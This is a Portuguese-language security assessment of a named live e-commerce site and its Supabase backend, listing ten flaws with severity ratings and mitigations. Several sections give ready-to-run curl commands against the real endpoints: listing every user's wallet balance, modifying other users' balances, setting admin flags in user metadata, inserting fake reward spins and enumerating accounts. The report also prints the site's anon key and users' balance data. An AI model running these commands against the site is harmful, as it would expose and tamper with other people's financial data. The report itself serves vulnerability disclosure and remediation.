# 🔴 FALHA 1: RLS Quebrado — user_wallets sem auth.uid() ❌ IMPRECISÃO CORRIGIDA

**Gravidade:** 🟡 ALTA (antes: CRÍTICA)  
**Local:** Tabela `public.user_wallets` no Supabase  
**Endpoint:** `https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets`

---

## Descrição

A Row-Level Security (RLS) da tabela `user_wallets` está configurada sem a checagem `auth.uid()`. Isso permite que QUALQUER usuário autenticado consulte e modifique carteiras de QUALQUER outro usuário diretamente via PostgREST.

**⚠️ CORREÇÃO IMPORTANTE:** O relatório anterior classificou esta falha como "criação de dinheiro infinito". Isso está **INCORRETO**. O app server-side (`/api/wallet`) utiliza `supabase.auth.getUser()` para validar que o usuário só vê PRÓPRIA carteira. A modificação via PostgREST direto **NÃO** se reflete no saldo exibido pelo app.

A falha REAL é:
1. **VAZAMENTO DE DADOS (Confidencialidade)** — qualquer atacante autenticado pode ver o saldo de TODOS os usuários
2. **MANIPULAÇÃO NÃO-AUTORIZADA** — atacante pode criar/modificar wallets no banco, mas isso não afeta o app
3. **RISCOS FUTUROS** — se o app mudar a lógica server-side, a vulnerabilidade pode se tornar crítica

## Como Explorar

### 1. Listar todas as carteiras (inclusive de outros usuários) — VAZAMENTO CONFIRMADO

```bash
curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN"
```

**Resultado:** Todas as 22 wallets são retornadas, incluindo:
- R$ 99.999,00 de 936aac17-...
- R$ 50.000,00 de 3b910ad3-...
- R$ 9.999,00 de 65b8cbef-...
- R$ 0,00 até R$ 126,77 das demais

### 2. Modificar saldo de qualquer carteira (SEM EFEITO no app)

```bash
curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?user_id=eq.TARGET_UUID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance":999999}'
```

**Resultado:** O DB é alterado (PATCH retorna 200), mas `/api/wallet` continua retornando `{"balance":0}` para o usuário — o server-side usa `auth.uid()` e ignora a modificação direta.

## Impacto REAL

- **ALTO**: Vazamento de dados financeiros de todos os 22 usuários da plataforma (saldos expostos)
- **MÉDIO**: Manipulação de dados no banco (pode causar confusão se houver serviços internos que leem o DB direto)
- **BAIXO**: Não é possível criar "dinheiro infinito" gastável no app

## Mitigação

Adicionar política RLS na tabela `user_wallets`:
```sql
CREATE POLICY "users_own_wallet" ON public.user_wallets
  FOR ALL USING (auth.uid() = user_id);
```

---

# 🔴 FALHA 2: Orders — Tabela exposta mas sem impacto ❌ IMPRECISÃO CORRIGIDA

**Gravidade:** 🟢 BAIXA (antes: CRÍTICA)  
**Local:** Tabela `public.orders`  
**Endpoints:** `POST /rest/v1/orders`

---

## Descrição

O relatório anterior afirmava que era possível criar ordens com status "completed" sem pagamento. **Isso está INCORRETO** por dois motivos:

1. **Schema diferente do assumido**: A tabela `orders` não tem coluna `items` — o schema real inclui `game_id`, `product_id`, `supplier_item_id`, `payment_method`, `pix_code`, `pix_qrcode`, `account_data` (JSON), `paid_at`, `delivered_at`, etc. É um schema de e-commerce completo, não uma tabela simples.

2. **INSERT direto falha**: `curl -X POST /rest/v1/orders` retorna erro `PGRST204: Could not find the 'items' column of 'orders'`. Mesmo com os campos corretos, não haveria geração de PIX code, account_data, etc — tudo isso é gerado server-side.

3. **Server-side valida**: O endpoint `/api/checkout/create` retorna "Faça login para continuar" sem cookie, e com cookie provavelmente segue o fluxo completo de pagamento (BassPag PIX + LZT Market).

A tabela `orders` aceita SELECT (com RLS — usuário vê apenas próprias ordens) e INSERT, mas INSERT sem os dados gerados server-side (pix_code, account_data, supplier_order_id) não cria uma ordem funcional.

## Impacto REAL

- **BAIXO**: Tabela exposta a INSERT mas sem utilidade para fraudes
- **NENHUM**: Não é possível comprar sem pagar via PostgREST direto

---

# 🟡 FALHA 3: Chave Anon do Supabase Exposta

**Gravidade:** 🟡 Média  
**Local:** HTML da página inicial (variável NEXT_PUBLIC_SUPABASE_ANON_KEY)

---

## Descrição

A chave anônima do Supabase está hardcoded no bundle JavaScript (público). Embora isso seja considerado "normal" pela documentação do Supabase (chave anon é feita pra ser pública), ela permite acesso não autenticado a todas as tabelas RLS e à API GoTrue.

## Chave Exposta

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoZnZpeXlrcGFsanp4Y21keWZoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjIzMDksImV4cCI6MjA5NDUzODMwOX0.
YzeYMHYwJYM-FMQwDFXTLAM7CzB-M0f3zi67-7ox5bU
```

## Impacto

- Permite acesso à API GoTrue (criar conta, login, etc.)
- Permite consultar tabelas com RLS aberta
- Base para ataques de JWT confusion (se o secret for fraco)

## Mitigação

- Usar variáveis de ambiente (já é NEXT_PUBLIC_ — ok para Next.js)
- Rotacionar a chave regularmente
- Garantir que RLS esteja correta em TODAS as tabelas

---

# 🟡 FALHA 4: Metadados de Usuário Modificáveis via GoTrue

**Gravidade:** 🟡 Média  
**Local:** `PUT /auth/v1/user` (GoTrue API)

---

## Descrição

Usuários autenticados podem modificar seus próprios `user_metadata` através da API GoTrue. Embora `app_metadata` exija privilégios administrativos, os metadados de usuário podem conter flags de permissão que alguns sistemas usam para controle de acesso.

## Como Explorar

```bash
# Adicionar flags de admin nos user_metadata
curl -s -X PUT "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/user" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":{"role":"admin","is_admin":true,"access_level":"admin"}}'
```

## Impacto

- Dependendo da implementação, flags em user_metadata podem conceder privilégios
- No caso do Legas Forn, o admin panel verifica APENAS `app_metadata` e é imune
- Outros sistemas no ecossistema podem usar `user_metadata` para autorização

## Mitigação

- Nunca usar `user_metadata` para decisões de autorização no servidor
- Validar permissões sempre via `app_metadata` (que requer service_role key)
- Implementar middleware de autorização centralizado

---

# 🟡 FALHA 5: Roda da Sorte Manipulável via API

**Gravidade:** 🟡 Média  
**Local:** `POST /api/wheel/spin`

---

## Descrição

A roda da sorte pode ser chamada diretamente via API, e os registros de spin podem ser inseridos diretamente na tabela `wheel_spins` com qualquer tipo de recompensa desejada.

## Como Explorar

```bash
# Chamar a roleta diretamente
curl -s -X POST "https://legasforn.com.br/api/wheel/spin" \
  -H "Cookie: sb-ahfviyykpaljzxcmdyfh-auth-token=$COOKIE"

# Inserir spin manual com recompensa customizada
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/wheel_spins" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"user_id":"SEU_UUID","reward_type":"coupon_20","reward_value":20,"coupon_code":"HACK20"}'
```

## Impacto

- Permite gerar cupons de desconto ilimitados (via API oficial)
- Inserir registros falsos na tabela de spins (sem efeito prático — cupons reais não são gerados)
- Abusar do sistema de recompensas

## Mitigação

- Validar servidor-side que o usuário tem direito a girar (cooldown/limite)
- Não permitir INSERT direto na tabela `wheel_spins` sem RLS
- Verificar integridade dos dados (um spin não pode ser inserido manualmente)

---

# 🟡 FALHA 6: Enumeração de Usuários via Signup

**Gravidade:** 🟡 Média  
**Local:** `POST /auth/v1/signup`

---

## Descrição

O Supabase retorna mensagens de erro diferentes para emails existentes vs. não existentes, permitindo enumeração de contas.

## Como Explorar

```bash
# Email existente → "User already registered"
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@legasforn.com.br","password":"teste123"}'
# Resposta: {"code":422,"msg":"User already registered"}

# Email não existente → cria conta com sucesso
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"aleatorio123456@teste.com","password":"teste123"}'
# Resposta: 200 com dados do usuário
```

## Impacto

- Atacante pode descobrir quais emails estão cadastrados na plataforma
- Pode ser usado para encontrar emails de administradores
- Base para ataques de phishing direcionados

## Mitigação

- Supabase não oferece mitigação nativa para isso
- Configurar rate limiting no projeto
- Usar "email confirmation required" para evitar criação automática

---

# 🟡 FALHA 7: Cookies de Autenticação sem HttpOnly (parcial)

**Gravidade:** 🟡 Média  
**Local:** Cookie `sb-ahfviyykpaljzxcmdyfh-auth-token`

---

## Descrição

O cookie de autenticação do Supabase SSR contém o access_token e refresh_token. O valor é chunked em `.0` e `.1` com formato `base64-{base64(json_session)}`.

**Nota:** O Supabase SSR mais recente define cookies com `HttpOnly=true` e `SameSite=Lax` por padrão. Confirmar se a configuração atual reflete isso.

## Como Explorar

```javascript
// Se o cookie não for HttpOnly (precisa confirmar)
document.cookie
// Retorna: "sb-ahfviyykpaljzxcmdyfh-auth-token.0=base64-..."
```

## Impacto

- Se houver qualquer XSS no site, o atacante pode roubar o token de autenticação
- Refresh token permite login persistente mesmo após troca de senha

## Mitigação

- Confirmar que `httpOnly: true` está configurado no Supabase SSR
- Configurar `sameSite: 'lax'` ou `'strict'`

---

# 🟢 FALHA 8: Tech Stack & Build ID Expostos

**Gravidade:** 🟢 Baixa  
**Local:** Headers HTTP, /_next/static/...

---

## Descrição

O servidor expõe diversas informações que facilitam fingerprinting:

- Build ID no caminho dos chunks: `/_next/static/chunks/` com hash único
- Headers de framework Next.js
- Caminho dos bundles JS com IDs numéricos
- Estrutura de diretórios do Turbopack

## Impacto

- Facilita reconhecimento para ataques direcionados
- Versões de dependências podem ser identificadas

## Mitigação

- Next.js expõe isso por padrão — mitigar via Cloudflare/WAF

---

# 🟢 FALHA 9: Endpoints Admin Expostos (403/401)

**Gravidade:** 🟢 Baixa  
**Local:** `/api/admin/*`

---

## Descrição

Múltiplos endpoints administrativos existem e retornam mensagens de erro distintas:

```
GET /api/admin/users     → 403 "Acesso negado"  (autenticado, role check falhou)
GET /api/admin/orders    → 403 "Acesso negado"
GET /api/admin/stats     → 403 "Acesso negado"
GET /api/admin/analytics → 403 "Acesso negado"
GET /api/admin/coupons   → 403 "Acesso negado"
GET /api/admin/users/role → 403 "Acesso negado"
```

## Impacto

- Revela existência de endpoints administrativos
- Diferença entre 401 (não autenticado) e 403 (não autorizado) permite identificar usuários válidos

## Mitigação

- Consolidar todas as respostas de erro em mensagens genéricas (ex: sempre 404)
- Implementar autenticação antes do roteamento

---

# 🟡 FALHA 10: Cupom INSTA5 com 100% sem Limite de Uso

**Gravidade:** 🟡 Média  
**Local:** Tabela `public.coupons`

---

## Descrição

O cupom `INSTA5` existe no banco com `discount_value: 100%` (desconto total) e `max_uses: 100`. Embora o servidor provavelmente limite o desconto máximo a 15% (como outros cupons — confirmado: orders com INSTA5 mostram 15% de desconto), a configuração no banco permite abuso se o limite não for verificado server-side.

**Nota:** Ordens reais usando INSTA5 mostram `discount_percent: 15` — o server-side CAPA o desconto em 15%, mesmo que o banco registre 100%. A falha é mitigada pelo server-side.

## Como Explorar

```
Cupom: INSTA5
Desconto no DB: 100%
Desconto real (server-side): 15% (capado)
Usos: 0/100
Valor mínimo: R$10
```

## Impacto

- **BAIXO**: O servidor capa o desconto em 15%, então o cupom de 100% não funciona como configurado
- Configuração incorreta no banco que pode se tornar crítica se a lógica server-side mudar

## Mitigação

- Validar desconto máximo server-side (já faz — cap em 15%)
- Corrigir o valor no banco para refletir o comportamento real (15%)
